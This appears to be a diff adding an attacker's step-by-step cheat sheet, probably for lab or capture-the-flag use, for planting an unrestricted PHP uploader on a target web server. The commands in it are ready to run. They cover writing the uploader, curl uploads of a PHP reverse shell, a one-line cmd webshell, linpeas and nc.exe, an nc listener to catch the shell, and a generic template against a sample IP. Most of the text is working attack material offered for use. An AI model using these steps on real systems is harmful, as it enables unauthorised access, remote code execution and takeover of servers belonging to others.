@@ -1,0 +1,153 @@
+######################################################################
+# STEP 0 – THE PHP UPLOADER CODE
+######################################################################
+
+# This is the uploader you have:
+#
+#   <?php
+#   if(isset($_FILES['file'])){
+#       move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
+#   }
+#   ?>
+#
+# Meaning:
+# - It waits for an HTTP POST request containing a file field named "file"
+# - $_FILES['file']['tmp_name'] = temporary path where PHP stored the upload
+# - $_FILES['file']['name']     = original filename from your machine
+# - move_uploaded_file(...)     = saves it in the SAME folder as uploader.php
+#
+# So if uploader.php is in:  /var/www/html/uploads/uploader.php
+# Then any file you upload will end up in: /var/www/html/uploads/<filename>
+
+
+######################################################################
+# STEP 1 – CREATE THE PHP UPLOADER FILE
+######################################################################
+
+# On YOUR machine (attacker), create a file called uploader.php:
+
+cat > uploader.php << 'EOF'
+<?php
+if(isset($_FILES['file'])){
+    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
+}
+?>
+EOF
+
+# Now uploader.php exists locally. You need to get it onto the TARGET.
+
+
+######################################################################
+# STEP 2 – GET uploader.php ONTO THE TARGET
+######################################################################
+
+# There are many ways (file upload vuln, RCE, FTP, etc.).
+# Example 1: You found a web file upload that allows .php (lucky case)
+# You upload uploader.php through that interface.
+#
+# After upload, suppose it appears at:
+#   http://TARGET/uploads/uploader.php
+#
+# Now you have a working uploader endpoint.
+
+
+######################################################################
+# STEP 3 – USE CURL TO UPLOAD A FILE THROUGH uploader.php
+######################################################################
+
+# Syntax:
+#   curl -X POST -F "file=@<local_file_to_upload>" http://TARGET/path/uploader.php
+#
+# The important part is:   -F "file=@<filename>"
+# That name "file" MUST MATCH this: $_FILES['file'] in the PHP code.
+
+# Example: upload a PHP reverse shell (php_reverse_shell.php) from YOUR machine
+curl -X POST -F "file=@php_reverse_shell.php" http://TARGET/uploads/uploader.php
+
+# What happens on the server:
+# - PHP receives your POST
+# - $_FILES['file']['tmp_name'] = /tmp/phpXYZ.tmp
+# - $_FILES['file']['name']     = php_reverse_shell.php
+# - move_uploaded_file() saves it as:
+#       /var/www/html/uploads/php_reverse_shell.php
+#
+# So you can now access your shell at:
+#       http://TARGET/uploads/php_reverse_shell.php
+
+
+######################################################################
+# STEP 4 – TRIGGER YOUR UPLOADED FILE
+######################################################################
+
+# If php_reverse_shell.php is a reverse shell that takes no params:
+#   1) Start listener:
+nc -lvnp 4444
+
+#   2) In browser:
+#       http://TARGET/uploads/php_reverse_shell.php
+
+
+# If it's a command webshell like:
+#   <?php system($_GET['cmd']); ?>
+#
+# Then:
+#       http://TARGET/uploads/php_reverse_shell.php?cmd=id
+
+
+
+######################################################################
+# STEP 5 – UPLOAD OTHER TOOLS (LINPEAS, BINARIES, SCRIPTS)
+######################################################################
+
+# Upload linpeas.sh to the target:
+curl -X POST -F "file=@linpeas.sh" http://TARGET/uploads/uploader.php
+
+# It will be saved as:
+#   http://TARGET/uploads/linpeas.sh   (file on disk: /var/www/html/uploads/linpeas.sh)
+
+# Then, from your shell on the target:
+chmod +x /var/www/html/uploads/linpeas.sh
+/var/www/html/uploads/linpeas.sh
+
+
+# Upload a Windows binary (example: nc.exe) in a Windows target:
+curl -X POST -F "file=@nc.exe" http://TARGET/uploads/uploader.php
+
+# It will be stored as:
+#   C:\inetpub\wwwroot\uploads\nc.exe
+# And can be run from your shell.
+
+
+######################################################################
+# STEP 6 – SUMMARY IN SIMPLE WORDS
+######################################################################
+
+# 1) uploader.php waits for a POST request with a file named "file"
+# 2) You send that using curl:  -F "file=@something"
+# 3) PHP saves "something" in the same folder as uploader.php
+# 4) You then browse to that file via HTTP or execute it from your shell
+#
+# That's all this uploader does: it turns remote file upload into a simple,
+# no-restriction "file drop" endpoint for any file you want (PHP, sh, exe, etc.).
+
+######################################################################
+# EXTRA: GENERIC TEMPLATE FOR CURL AGAINST THIS UPLOADER
+######################################################################
+
+# Upload ANY local file:
+curl -X POST -F "file=@LOCAL_FILE_NAME" http://TARGET/PATH/uploader.php
+
+# After that, the file will be accessible at:
+#   http://TARGET/PATH/LOCAL_FILE_NAME
+#
+# Example:
+#   LOCAL_FILE_NAME = shell.php
+#   TARGET = 10.10.10.10
+#   PATH = uploads
+#
+# Command:
+curl -X POST -F "file=@shell.php" http://10.10.10.10/uploads/uploader.php
+#
+# File URL:
+#   http://10.10.10.10/uploads/shell.php
+######################################################################
